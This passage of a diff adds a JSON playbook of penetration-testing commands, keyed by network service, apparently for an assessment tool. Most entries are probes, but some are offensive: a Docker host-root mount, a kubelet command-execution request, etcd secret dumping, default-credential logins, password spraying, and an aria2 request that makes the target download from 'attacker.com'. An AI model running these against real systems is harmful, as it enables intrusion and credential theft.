+    "notes": "Enumerate extensions with svwar. Check for unauthenticated calls and INVITE flooding."
+  },
+  "rtsp": {
+    "ports": [
+      554,
+      8554
+    ],
+    "protocol": "tcp",
+    "description": "Real Time Streaming Protocol (IP cameras)",
+    "context": "both",
+    "category": "media",
+    "tools": [
+      "nmap",
+      "cvedetails",
+      "curl",
+      "vlc"
+    ],
+    "commands": [
+      "nmap --script rtsp-url-brute,rtsp-methods -p554 TARGET",
+      "curl -s rtsp://TARGET/",
+      "curl -s 'rtsp://admin:admin@TARGET/stream1'"
+    ],
+    "notes": "IP cameras often use RTSP. Try default credentials (admin/admin, admin/blank)."
+  },
+  "docker": {
+    "ports": [
+      2375,
+      2376
+    ],
+    "protocol": "tcp",
+    "description": "Docker remote API",
+    "context": "both",
+    "category": "container",
+    "tools": [
+      "curl",
+      "docker",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:2375/version",
+      "curl -s http://TARGET:2375/containers/json",
+      "curl -s http://TARGET:2375/images/json",
+      "docker -H tcp://TARGET:2375 ps",
+      "docker -H tcp://TARGET:2375 images",
+      "docker -H tcp://TARGET:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    ],
+    "notes": "Unauthenticated Docker API = full host compromise via privileged container mount. Port 2376 is TLS."
+  },
+  "kubernetes": {
+    "ports": [
+      6443,
+      8001,
+      10250,
+      10255
+    ],
+    "protocol": "tcp",
+    "products": [
+      "kubernetes",
+      "kubelet",
+      "kube-apiserver"
+    ],
+    "description": "Kubernetes API and node services",
+    "context": "both",
+    "category": "container",
+    "tools": [
+      "kubectl",
+      "curl",
+      "nmap",
+      "kube-hunter"
+    ],
+    "commands": [
+      "curl -k https://TARGET:6443/version",
+      "curl -k https://TARGET:6443/api/v1/namespaces",
+      "curl -k https://TARGET:6443/api/v1/pods",
+      "kubectl cluster-info --server=https://TARGET:6443 --insecure-skip-tls-verify",
+      "kubectl get pods --all-namespaces --server=https://TARGET:6443 --insecure-skip-tls-verify",
+      "curl -sk http://TARGET:10255/pods",
+      "curl -sk https://TARGET:10250/run/default/POD/CONTAINER -d 'cmd=id'",
+      "kube-hunter --remote TARGET"
+    ],
+    "notes": "Kubelet read-only port 10255 and anonymous API access are critical. Check for RBAC misconfigs."
+  },
+  "etcd": {
+    "ports": [
+      2379,
+      2380
+    ],
+    "protocol": "tcp",
+    "description": "etcd distributed key-value store (Kubernetes backend)",
+    "context": "internal",
+    "category": "container",
+    "tools": [
+      "curl",
+      "etcdctl"
+    ],
+    "commands": [
+      "curl -s http://TARGET:2379/version",
+      "curl -s http://TARGET:2379/v2/keys/",
+      "etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only",
+      "etcdctl --endpoints=http://TARGET:2379 get /registry/secrets --prefix"
+    ],
+    "notes": "Unauthenticated etcd can expose all Kubernetes secrets including service account tokens."
+  },
+  "grafana": {
+    "ports": [
+      3000
+    ],
+    "protocol": "tcp",
+    "description": "Grafana metrics visualization",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nuclei",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:3000/api/health",
+      "curl -s http://TARGET:3000/api/org",
+      "curl -s -u admin:admin http://TARGET:3000/api/datasources",
+      "curl -s http://TARGET:3000/api/users",
+      "nuclei -u http://TARGET:3000 -t /root/nuclei-templates/exposures/",
+      "nmap --script http-title -p3000 TARGET"
+    ],
+    "notes": "Default creds: admin/admin. CVE-2021-43798 path traversal for older versions."
+  },
+  "prometheus": {
+    "ports": [
+      9091
+    ],
+    "protocol": "tcp",
+    "services": [
+      "prometheus"
+    ],
+    "products": [
+      "prometheus"
+    ],
+    "description": "Prometheus monitoring and alerting",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:9090/api/v1/targets",
+      "curl -s http://TARGET:9090/api/v1/label/__name__/values",
+      "curl -s http://TARGET:9090/api/v1/query?query=up",
+      "curl -s http://TARGET:9090/-/reload -X POST",
+      "curl -s http://TARGET:9090/api/v1/rules"
+    ],
+    "notes": "Unauthenticated Prometheus exposes scrape targets, internal IPs, and metrics data."
+  },
+  "alertmanager": {
+    "ports": [
+      9093
+    ],
+    "protocol": "tcp",
+    "description": "Prometheus Alertmanager",
+    "context": "internal",
+    "category": "devops",
+    "tools": [
+      "curl"
+    ],
+    "commands": [
+      "curl -s http://TARGET:9093/api/v1/alerts",
+      "curl -s http://TARGET:9093/api/v2/receivers",
+      "curl -s http://TARGET:9093/api/v2/silences"
+    ],
+    "notes": "Can expose webhook URLs and notification configs (Slack tokens, PagerDuty keys)."
+  },
+  "consul": {
+    "ports": [
+      8500,
+      8501,
+      8600
+    ],
+    "protocol": "tcp/udp",
+    "description": "HashiCorp Consul service mesh and discovery",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8500/v1/catalog/services",
+      "curl -s http://TARGET:8500/v1/catalog/nodes",
+      "curl -s http://TARGET:8500/v1/agent/members",
+      "curl -s http://TARGET:8500/v1/kv/?recurse",
+      "curl -s http://TARGET:8500/v1/acl/list"
+    ],
+    "notes": "KV store may contain secrets, service configs, and tokens. Port 8600 is DNS interface."
+  },
+  "vault": {
+    "ports": [
+      8200
+    ],
+    "protocol": "tcp",
+    "description": "HashiCorp Vault secrets management",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "vault"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8200/v1/sys/health",
+      "curl -s http://TARGET:8200/v1/sys/seal-status",
+      "curl -s -H 'X-Vault-Token: TOKEN' http://TARGET:8200/v1/secret/",
+      "curl -s http://TARGET:8200/v1/auth/token/lookup-self -H 'X-Vault-Token: TOKEN'",
+      "vault status -address=http://TARGET:8200",
+      "vault secrets list -address=http://TARGET:8200"
+    ],
+    "notes": "Check seal status, enumerate secret paths with discovered tokens. Look for root token exposure."
+  },
+  "jenkins": {
+    "ports": [
+      50000
+    ],
+    "protocol": "tcp",
+    "products": [
+      "jenkins"
+    ],
+    "description": "Jenkins CI/CD automation server",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nuclei",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8080/",
+      "curl -s http://TARGET:8080/api/json",
+      "curl -s http://TARGET:8080/asynchPeople/",
+      "curl -s http://TARGET:8080/script",
+      "nuclei -u http://TARGET:8080 -t /root/nuclei-templates/exposures/",
+      "curl -s http://TARGET:8080/manage",
+      "curl -u admin:admin http://TARGET:8080/crumbIssuer/api/json"
+    ],
+    "notes": "Port 50000 is JNLP agent port. Check for unauthenticated script console (Groovy RCE)."
+  },
+  "gitlab": {
+    "ports": [],
+    "protocol": "tcp",
+    "products": [
+      "gitlab"
+    ],
+    "services": [
+      "gitlab",
+      "gitlab-workhorse",
+      "gitaly"
+    ],
+    "description": "GitLab DevOps platform",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s http://TARGET/api/v4/version",
+      "curl -s http://TARGET/api/v4/projects?visibility=public",
+      "curl -s http://TARGET/users/sign_in",
+      "nuclei -u http://TARGET -t /root/nuclei-templates/ -tags gitlab",
+      "curl -s 'http://TARGET/-/metrics'"
+    ],
+    "notes": "Check for public repos, user enumeration, and version-specific CVEs. Default admin password prompt on first login."
+  },
+  "sonarqube": {
+    "ports": [
+      9000
+    ],
+    "protocol": "tcp",
+    "description": "SonarQube code quality platform",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:9000/api/system/status",
+      "curl -s -u admin:admin http://TARGET:9000/api/projects/search",
+      "curl -s http://TARGET:9000/api/users/search"
+    ],
+    "notes": "Default creds: admin/admin. Exposes source code, security findings, and secrets in scan results."
+  },
+  "nexus": {
+    "ports": [
+      8081
+    ],
+    "protocol": "tcp",
+    "products": [
+      "nexus",
+      "sonatype nexus"
+    ],
+    "description": "Sonatype Nexus repository manager",
+    "context": "internal",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8081/",
+      "curl -s -u admin:admin123 http://TARGET:8081/service/rest/v1/repositories",
+      "curl -s http://TARGET:8081/service/rest/v1/status"
+    ],
+    "notes": "Default creds: admin/admin123. Can host malicious packages for supply chain attacks."
+  },
+  "rabbitmq": {
+    "ports": [
+      5672,
+      15672,
+      61613
+    ],
+    "protocol": "tcp",
+    "description": "RabbitMQ message broker",
+    "context": "both",
+    "category": "messaging",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:15672/",
+      "curl -s -u guest:guest http://TARGET:15672/api/overview",
+      "curl -s -u guest:guest http://TARGET:15672/api/vhosts",
+      "curl -s -u guest:guest http://TARGET:15672/api/queues",
+      "curl -s -u guest:guest http://TARGET:15672/api/users"
+    ],
+    "notes": "Default creds: guest/guest (localhost only by default). Port 15672 = management UI."
+  },
+  "kafka": {
+    "ports": [
+      9092,
+      9093,
+      2181
+    ],
+    "protocol": "tcp",
+    "description": "Apache Kafka message streaming",
+    "context": "internal",
+    "category": "messaging",
+    "tools": [
+      "kafka-topics",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script banner -p9092 TARGET",
+      "kafka-topics.sh --bootstrap-server TARGET:9092 --list",
+      "kafka-console-consumer.sh --bootstrap-server TARGET:9092 --topic TOPIC --from-beginning --max-messages 10",
+      "kafka-consumer-groups.sh --bootstrap-server TARGET:9092 --list"
+    ],
+    "notes": "Port 2181 is ZooKeeper. Unauthenticated Kafka can expose sensitive message payloads."
+  },
+  "zookeeper": {
+    "ports": [
+      2181,
+      2888,
+      3888
+    ],
+    "protocol": "tcp",
+    "description": "Apache ZooKeeper distributed coordination",
+    "context": "internal",
+    "category": "infrastructure",
+    "tools": [
+      "nc",
+      "zkCli",
+      "nmap"
+    ],
+    "commands": [
+      "echo 'stat' | nc TARGET 2181",
+      "echo 'mntr' | nc TARGET 2181",
+      "echo 'dump' | nc TARGET 2181",
+      "zkCli.sh -server TARGET:2181 ls /",
+      "zkCli.sh -server TARGET:2181 get /zookeeper/config"
+    ],
+    "notes": "Can contain Kafka configs, HBase data, and application configs."
+  },
+  "git_daemon": {
+    "ports": [
+      9418
+    ],
+    "protocol": "tcp",
+    "services": [
+      "git-daemon",
+      "git_daemon",
+      "git daemon"
+    ],
+    "description": "Git protocol daemon",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "git",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script git-info -p9418 TARGET",
+      "git ls-remote git://TARGET/",
+      "git clone git://TARGET/REPO.git"
+    ],
+    "notes": "Unauthenticated read access to git repos. May expose source code and credentials in history."
+  },
+  "svn": {
+    "ports": [
+      3690
+    ],
+    "protocol": "tcp",
+    "description": "Subversion version control",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "svn",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script svn-brute -p3690 TARGET",
+      "svn info svn://TARGET/",
+      "svn list svn://TARGET/",
+      "svn checkout svn://TARGET/REPO"
+    ],
+    "notes": "Anonymous SVN can expose source code. Check for .svn directories in web roots."
+  },
+  "bgp": {
+    "ports": [
+      179
+    ],
+    "protocol": "tcp",
+    "description": "Border Gateway Protocol",
+    "context": "external",
+    "category": "network",
+    "tools": [
+      "nmap",
+      "bgpq3"
+    ],
+    "commands": [
+      "nmap --script bgp-open -p179 TARGET",
+      "bgpq3 -AS ASNUM"
+    ],
+    "notes": "Misconfigured BGP can allow route hijacking. Map AS numbers and BGP peers."
+  },
+  "ldap_gc": {
+    "ports": [
+      3268,
+      3269
+    ],
+    "protocol": "tcp",
+    "services": [
+      "ldap-gc",
+      "ldap_gc",
+      "global-catalog"
+    ],
+    "description": "LDAP Global Catalog (Active Directory)",
+    "context": "internal",
+    "category": "directory",
+    "tools": [
+      "ldapsearch",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script ldap-rootdse -p3268 TARGET",
+      "ldapsearch -x -H ldap://TARGET:3268 -s base",
+      "ldapsearch -x -H ldap://TARGET:3268 -b 'dc=DOMAIN,dc=local' '(objectClass=user)' sAMAccountName"
+    ],
+    "notes": "Global Catalog contains a partial replica of all objects in the forest. Port 3269 is GC over SSL."
+  },
+  "dhcp": {
+    "ports": [
+      67,
+      68
+    ],
+    "protocol": "udp",
+    "description": "Dynamic Host Configuration Protocol",
+    "context": "internal",
+    "category": "network",
+    "tools": [
+      "nmap",
+      "dhcpig"
+    ],
+    "commands": [
+      "nmap --script broadcast-dhcp-discover -e IFACE",
+      "nmap --script dhcp-discover -sU -p67 TARGET",
+      "dhcpig -i IFACE"
+    ],
+    "notes": "Rogue DHCP can redirect traffic. DHCP starvation is a DoS vector."
+  },
+  "ipsec_vpn": {
+    "ports": [
+      500,
+      4500
+    ],
+    "protocol": "udp",
+    "services": [
+      "isakmp",
+      "ike",
+      "ipsec",
+      "ipsec-vpn",
+      "ipsec_vpn"
+    ],
+    "description": "IPsec VPN / IKE",
+    "context": "external",
+    "category": "vpn",
+    "tools": [
+      "nmap",
+      "ike-scan"
+    ],
+    "commands": [
+      "nmap --script ike-version -sU -p500 TARGET",
+      "ike-scan TARGET",
+      "ike-scan --mode aggressive TARGET"
+    ],
+    "notes": "Enumerate IKE transforms and check for aggressive mode pre-shared key cracking."
+  },
+  "openvpn": {
+    "ports": [
+      1194
+    ],
+    "protocol": "tcp/udp",
+    "description": "OpenVPN",
+    "context": "external",
+    "category": "vpn",
+    "tools": [
+      "nmap"
+    ],
+    "commands": [
+      "nmap -sU -sT -p1194 TARGET",
+      "nmap --script banner -p1194 TARGET"
+    ],
+    "notes": "Identify OpenVPN version for known CVEs."
+  },
+  "irc": {
+    "ports": [
+      6667,
+      6697
+    ],
+    "protocol": "tcp",
+    "description": "Internet Relay Chat",
+    "context": "both",
+    "category": "communication",
+    "tools": [
+      "nmap",
+      "irssi"
+    ],
+    "commands": [
+      "nmap --script irc-info,irc-unrealircd-backdoor -p6667,6697 TARGET",
+      "nmap --script irc-botnet-channels -p6667 TARGET"
+    ],
+    "notes": "Check for Unreal IRCd backdoor (CVE-2010-2075). May be C2 channel indicator."
+  },
+  "squid": {
+    "ports": [
+      3128
+    ],
+    "protocol": "tcp",
+    "products": [
+      "squid"
+    ],
+    "description": "Squid HTTP proxy",
+    "context": "both",
+    "category": "proxy",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s -x http://TARGET:3128 http://ifconfig.me",
+      "curl -s -x http://TARGET:3128 http://internalhost/",
+      "nmap --script http-open-proxy -p3128,8080 TARGET"
+    ],
+    "notes": "Open proxy can be used to pivot to internal network or bypass firewall controls."
+  },
+  "socks": {
+    "ports": [
+      1080
+    ],
+    "protocol": "tcp",
+    "description": "SOCKS proxy",
+    "context": "both",
+    "category": "proxy",
+    "tools": [
+      "nmap",
+      "curl"
+    ],
+    "commands": [
+      "nmap --script socks-open-proxy -p1080 TARGET",
+      "curl --socks5 TARGET:1080 http://TARGET"
+    ],
+    "notes": "Open SOCKS proxy enables pivoting into internal networks."
+  },
+  "hadoop": {
+    "ports": [
+      50070,
+      50075,
+      8088,
+      9000
+    ],
+    "protocol": "tcp",
+    "description": "Apache Hadoop distributed computing",
+    "context": "internal",
+    "category": "bigdata",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:50070/webhdfs/v1/?op=LISTSTATUS",
+      "curl -s http://TARGET:50070/webhdfs/v1/user?op=LISTSTATUS",
+      "curl -s http://TARGET:8088/cluster",
+      "curl -s http://TARGET:8088/ws/v1/cluster/apps"
+    ],
+    "notes": "Unauthenticated HDFS can expose sensitive data. YARN RCE via job submission on port 8088."
+  },
+  "spark": {
+    "ports": [
+      7077,
+      4040
+    ],
+    "protocol": "tcp",
+    "products": [
+      "spark",
+      "apache spark"
+    ],
+    "description": "Apache Spark distributed computing",
+    "context": "internal",
+    "category": "bigdata",
+    "tools": [
+      "curl"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8080/",
+      "curl -s http://TARGET:4040/api/v1/applications",
+      "curl -s http://TARGET:8080/json/"
+    ],
+    "notes": "Unauthenticated Spark master allows job submission = RCE."
+  },
+  "jupyter": {
+    "ports": [
+      8888,
+      8889
+    ],
+    "protocol": "tcp",
+    "description": "Jupyter Notebook / JupyterLab",
+    "context": "both",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8888/api",
+      "curl -s http://TARGET:8888/tree",
+      "curl -s http://TARGET:8888/api/kernels",
+      "curl -s http://TARGET:8888/api/contents"
+    ],
+    "notes": "Unauthenticated Jupyter = arbitrary code execution in notebook environment."
+  },
+  "airflow": {
+    "ports": [
+      8793
+    ],
+    "protocol": "tcp",
+    "products": [
+      "airflow",
+      "apache airflow"
+    ],
+    "description": "Apache Airflow workflow management",
+    "context": "internal",
+    "category": "devops",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s http://TARGET:8080/api/v1/dags",
+      "curl -s -u admin:admin http://TARGET:8080/api/v1/connections",
+      "curl -s -u admin:admin http://TARGET:8080/api/v1/variables"
+    ],
+    "notes": "Default creds: admin/admin. Connections and variables store plaintext credentials."
+  },
+  "mqtt": {
+    "ports": [
+      1883,
+      8883
+    ],
+    "protocol": "tcp",
+    "description": "MQTT IoT messaging protocol",
+    "context": "both",
+    "category": "iot",
+    "tools": [
+      "mosquitto_sub",
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script mqtt-subscribe -p1883 TARGET",
+      "mosquitto_sub -h TARGET -t '#' -v",
+      "mosquitto_sub -h TARGET -t '$SYS/#' -v"
+    ],
+    "notes": "Subscribe to '#' wildcard to capture all topics. Port 8883 is MQTTS. Often no auth."
+  },
+  "modbus": {
+    "ports": [
+      502
+    ],
+    "protocol": "tcp",
+    "description": "Modbus industrial control protocol",
+    "context": "internal",
+    "category": "ics_scada",
+    "tools": [
+      "nmap",
+      "modbusclient"
+    ],
+    "commands": [
+      "nmap --script modbus-discover -p502 TARGET",
+      "nmap -sV --script modbus-discover -p502 TARGET"
+    ],
+    "notes": "ICS/SCADA protocol. No authentication. Read/write coils and registers with caution."
+  },
+  "dnp3": {
+    "ports": [
+      20000
+    ],
+    "protocol": "tcp",
+    "description": "DNP3 SCADA protocol",
+    "context": "internal",
+    "category": "ics_scada",
+    "tools": [
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script dnp3-info -p20000 TARGET"
+    ],
+    "notes": "Industrial control system protocol. Treat with extreme care in production environments."
+  },
+  "bacnet": {
+    "ports": [
+      47808
+    ],
+    "protocol": "udp",
+    "description": "BACnet building automation protocol",
+    "context": "internal",
+    "category": "ics_scada",
+    "tools": [
+      "nmap"
+    ],
+    "commands": [
+      "nmap --script bacnet-info -sU -p47808 TARGET"
+    ],
+    "notes": "Building automation systems (HVAC, access control). Often no authentication."
+  },
+  "wsdiscovery": {
+    "ports": [
+      3702
+    ],
+    "protocol": "udp",
+    "description": "WS-Discovery (network device discovery)",
+    "context": "internal",
+    "category": "network",
+    "tools": [
+      "nmap"
+    ],
+    "commands": [
+      "nmap -sU -p3702 --script ws-discovery TARGET"
+    ],
+    "notes": "Discovers WS-Discovery enabled devices (printers, cameras, Windows machines)."
+  },
+  "upnp": {
+    "ports": [
+      1900,
+      5000
+    ],
+    "protocol": "udp/tcp",
+    "description": "Universal Plug and Play",
+    "context": "internal",
+    "category": "network",
+    "tools": [
+      "nmap",
+      "miranda"
+    ],
+    "commands": [
+      "nmap --script upnp-info -sU -p1900 TARGET",
+      "miranda -i TARGET"
+    ],
+    "notes": "UPnP can expose internal device info and allow port forwarding manipulation."
+  },
+  "nping_msexchange": {
+    "ports": [
+      135,
+      593
+    ],
+    "protocol": "tcp",
+    "services": [
+      "nping-msexchange",
+      "nping_msexchange",
+      "msexchange"
+    ],
+    "products": [
+      "microsoft exchange",
+      "exchange"
+    ],
+    "description": "Microsoft Exchange RPC over HTTP",
+    "context": "both",
+    "category": "email",
+    "tools": [
+      "curl",
+      "nmap"
+    ],
+    "commands": [
+      "curl -s https://TARGET/autodiscover/autodiscover.xml",
+      "curl -s https://TARGET/ews/exchange.asmx",
+      "curl -s https://TARGET/owa/",
+      "curl -s https://TARGET/ecp/",
+      "curl -s https://TARGET/mapi/",
+      "nmap --script http-auth -p443 TARGET"
+    ],
+    "notes": "Check for ProxyLogon/ProxyShell (CVE-2021-26855, CVE-2021-34473). Enumerate OWA/ECP/EWS."
+  },
+  "sharepoint": {
+    "ports": [],
+    "protocol": "tcp",
+    "products": [
+      "sharepoint",
+      "microsoft sharepoint"
+    ],
+    "services": [
+      "sharepoint"
+    ],
+    "description": "Microsoft SharePoint",
+    "context": "both",
+    "category": "web",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s http://TARGET/_layouts/15/AreaNavigationSettings.aspx",
+      "curl -s http://TARGET/_api/web/lists",
+      "curl -s http://TARGET/_vti_bin/lists.asmx",
+      "nuclei -u http://TARGET -tags sharepoint"
+    ],
+    "notes": "Check for CVE-2022-29108, CVE-2023-29357. Enumerate lists and documents via API."
+  },
+  "citrix": {
+    "ports": [
+      1494,
+      2598
+    ],
+    "protocol": "tcp",
+    "products": [
+      "citrix",
+      "netscaler",
+      "xenapp",
+      "xendesktop"
+    ],
+    "description": "Citrix Virtual Apps and Desktops",
+    "context": "both",
+    "category": "remote_access",
+    "tools": [
+      "nmap",
+      "nuclei"
+    ],
+    "commands": [
+      "nmap --script citrix-brute-xml -p1494,2598 TARGET",
+      "curl -s https://TARGET/Citrix/XenApp/",
+      "nuclei -u https://TARGET -tags citrix"
+    ],
+    "notes": "Check for Citrix Bleed (CVE-2023-4966), CVE-2019-19781 (Shitrix path traversal)."
+  },
+  "fortigate": {
+    "ports": [
+      4433,
+      10443
+    ],
+    "protocol": "tcp",
+    "products": [
+      "fortigate",
+      "fortinet"
+    ],
+    "description": "Fortinet FortiGate VPN / Firewall",
+    "context": "external",
+    "category": "vpn",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s -k https://TARGET/remote/login",
+      "curl -s -k https://TARGET/api/v2/",
+      "nuclei -u https://TARGET -tags fortinet,fortigate"
+    ],
+    "notes": "Check for CVE-2022-40684, CVE-2023-27997. Enumerate VPN portals and management interfaces."
+  },
+  "paloalto": {
+    "ports": [
+      4443
+    ],
+    "protocol": "tcp",
+    "products": [
+      "palo alto",
+      "paloalto",
+      "globalprotect",
+      "pan-os"
+    ],
+    "description": "Palo Alto Networks GlobalProtect VPN",
+    "context": "external",
+    "category": "vpn",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s -k https://TARGET/global-protect/login.esp",
+      "curl -s -k https://TARGET/php/login.php",
+      "nuclei -u https://TARGET -tags paloalto"
+    ],
+    "notes": "Check for CVE-2024-3400 (OS command injection). Enumerate GP portal."
+  },
+  "pulse_vpn": {
+    "ports": [
+      4443
+    ],
+    "protocol": "tcp",
+    "services": [
+      "pulse-vpn",
+      "pulse_vpn"
+    ],
+    "products": [
+      "pulse secure",
+      "ivanti",
+      "connect secure"
+    ],
+    "description": "Ivanti Pulse Secure VPN",
+    "context": "external",
+    "category": "vpn",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s -k https://TARGET/dana-na/auth/url_default/welcome.cgi",
+      "nuclei -u https://TARGET -tags pulse-secure,ivanti"
+    ],
+    "notes": "Check for CVE-2019-11510, CVE-2023-46805, CVE-2024-21887."
+  },
+  "aria2": {
+    "ports": [
+      6800
+    ],
+    "protocol": "tcp",
+    "description": "aria2 download manager RPC",
+    "context": "both",
+    "category": "service",
+    "tools": [
+      "curl"
+    ],
+    "commands": [
+      "curl -s http://TARGET:6800/jsonrpc -d '{\"jsonrpc\":\"2.0\",\"method\":\"aria2.getGlobalStat\",\"id\":1}'",
+      "curl -s http://TARGET:6800/jsonrpc -d '{\"jsonrpc\":\"2.0\",\"method\":\"aria2.addUri\",\"id\":1,\"params\":[[\"http://attacker.com/\"]]}'"
+    ],
+    "notes": "Unauthenticated RPC allows arbitrary file download and SSRF."
+  },
+  "phpmyadmin": {
+    "ports": [],
+    "protocol": "tcp",
+    "products": [
+      "phpmyadmin"
+    ],
+    "services": [
+      "phpmyadmin",
+      "phpmyadmin web"
+    ],
+    "description": "phpMyAdmin web database admin",
+    "context": "both",
+    "category": "web",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s http://TARGET/phpmyadmin/",
+      "curl -s http://TARGET/pma/",
+      "curl -s http://TARGET/phpMyAdmin/",
+      "nuclei -u http://TARGET -tags phpmyadmin"
+    ],
+    "notes": "Default paths: /phpmyadmin, /pma, /phpMyAdmin. Check for CVE-2018-12613 (LFI)."
+  },
+  "webmin": {
+    "ports": [
+      10000
+    ],
+    "protocol": "tcp",
+    "description": "Webmin system administration panel",
+    "context": "both",
+    "category": "management",
+    "tools": [
+      "curl",
+      "nmap",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s https://TARGET:10000/",
+      "nmap --script http-title -p10000 TARGET",
+      "nuclei -u https://TARGET:10000 -tags webmin"
+    ],
+    "notes": "CVE-2019-15107 (backdoor), CVE-2019-12840 (RCE). Check for default creds."
+  },
+  "cpanel": {
+    "ports": [
+      2082,
+      2083,
+      2086,
+      2087,
+      2095,
+      2096
+    ],
+    "protocol": "tcp",
+    "description": "cPanel web hosting control panel",
+    "context": "external",
+    "category": "management",
+    "tools": [
+      "curl",
+      "nuclei"
+    ],
+    "commands": [
+      "curl -s http://TARGET:2082/",
+      "curl -s https://TARGET:2083/",
+      "curl -s https://TARGET:2087/",
+      "nuclei -u https://TARGET:2083 -tags cpanel"
+    ],
+    "notes": "Port 2082/2083 = cPanel, 2086/2087 = WHM, 2095/2096 = webmail."
+  },
+  "printer": {
+    "ports": [
+      515,
+      631,
+      9100
+    ],
+    "protocol": "tcp",
+    "description": "Network printer services (LPD/IPP/RAW)",
+    "context": "internal",
+    "category": "service",
+    "tools": [
+      "nmap",
+      "pret"
+    ],
+    "commands": [
+      "nmap --script pjl-ready-message,printer-info -p9100 TARGET",
+      "nmap --script lpd-info -p515 TARGET",
+      "nmap --script cups-info -p631 TARGET",
+      "pret TARGET pjl",
+      "pret TARGET ps"
+    ],
+    "notes": "Printers can store print jobs with sensitive data. PRET enables advanced printer exploitation."
+  },
+  "ajp13": {
+    "services": [
+      "ajp13"
+    ],
+    "ports": [
+      8009
+    ],
+    "commands": [
+      "nmap --script ajp-headers,ajp-request -p8009 TARGET",
+      "nmap --script ajp-auth -p8009 TARGET",
+      "curl -v http://TARGET:8009/"
+    ]
+  },
+  "shell": {
+    "services": [
+      "shell",
+      "rsh",
+      "rlogin"
+    ],
+    "ports": [
+      514,
+      512,
+      513
+    ],
+    "commands": [
+      "nmap --script rsh-brute -p514 TARGET",
+      "nmap --script rsh-brute,rusers,rpcinfo -p512,513,514 TARGET"
+    ]
+  },
+  "iscsi": {
+    "services": [
+      "iscsi"
+    ],
+    "ports": [
+      3260
+    ],
+    "commands": [
+      "nmap --script iscsi-info,iscsi-brute -p3260 TARGET",
+      "nmap --script iscsi-info -p3260 TARGET"
+    ]
+  },
+  "vmware": {
+    "services": [
+      "vmware-auth",
+      "vmware-authd",
+      "esxi"
+    ],
+    "ports": [
+      902,
+      443,
+      8443
+    ],
+    "commands": [
+      "nmap --script vmware-version -p443 TARGET",
+      "curl -k https://TARGET/sdk",
+      "curl -k https://TARGET/ui/"
+    ]
+  },
+  "wsmans": {
+    "services": [
+      "wsmans",
+      "winrm"
+    ],
+    "ports": [
+      5985,
+      5986
+    ],
+    "commands": [
+      "crackmapexec winrm TARGET",
+      "crackmapexec winrm TARGET -u users.txt -p passwords.txt",
+      "nmap --script http-auth -p5985,5986 TARGET"
+    ]
+  },
+  "flexlm": {
+    "services": [
+      "flexlm",
+      "flexnetlicensing"
+    ],
+    "ports": [
+      27000,
+      27001,
+      27002
+    ],
+    "commands": [
+      "nmap --script flexlm-info -p27000 TARGET",
+      "nmap -sV -p27000,27001,27002 TARGET"
+    ]
+  },
+  "zeus-admin": {
+    "services": [
+      "zeus-admin"
+    ],
+    "ports": [
+      9090
+    ],
+    "commands": [
+      "nmap -sV -sC -p9090 TARGET",
+      "curl -v http://TARGET:9090/",
+      "nikto -h http://TARGET:9090"
+    ]
+  },
+  "winbox": {
+    "services": [
+      "winbox"
+    ],
+    "ports": [
+      8291
+    ],
+    "commands": [
+      "nmap -sV -p8291 TARGET",
+      "nmap --script banner -p8291 TARGET"
+    ]
+  },
+  "winshadow": {
+    "services": [
+      "winshadow"
+    ],
+    "ports": [
+      3261
+    ],
+    "commands": [
+      "nmap -sV -sC -p3261 TARGET",
+      "nmap --script banner -p3261 TARGET"
+    ]
+  },
+
+  "http_apache": {
+    "ports": [80, 443, 8080, 8443],
+    "services": ["http", "https"],
+    "products": ["apache"],
+    "description": "Apache HTTP Server - product-specific checks",
+    "commands": [
+      "curl -s http://TARGET/server-status",
+      "curl -s http://TARGET/server-info",
+      "curl -s http://TARGET/.htaccess",
+      "curl -s http://TARGET/.htpasswd",
+      "nmap --script http-apache-negotiation,http-server-header -p PORT TARGET",
+      "curl -s -H 'Range: bytes=0-18446744073709551615' http://TARGET/",
